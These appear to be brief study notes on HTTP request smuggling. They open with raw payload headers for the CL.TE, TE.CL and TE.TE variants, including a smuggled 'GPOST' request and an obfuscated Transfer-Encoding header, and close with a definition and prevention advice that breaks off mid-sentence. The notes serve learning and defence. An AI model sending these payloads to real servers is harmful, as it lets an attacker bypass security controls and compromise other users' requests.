**** POST method
*** send the requst twice
===========================

CL.TE:
------

Content-Length: 6
Transfer-Encoding: chunked

0

G 

===========================
TE.CL:
------

Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

============================

TE.TE:
------

Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

============================
What is HTTP request smuggling:
-------------------------------

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users
HTTP request smuggling vulnerabilities arise in situations where a front-end server forwards multiple requests to a back-end server over the same network connection, and the protocol used for the back-end connections carries the risk that the two servers disagree about the boundaries between requests

prevention:
-----------

1)Disable reuse of back-end connections, so that each back-end request is sent over a separate network connection.
2)Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.
3)Use exactly the same web server software for the front-end and back-end servers, so that they agree about the boundaries between re
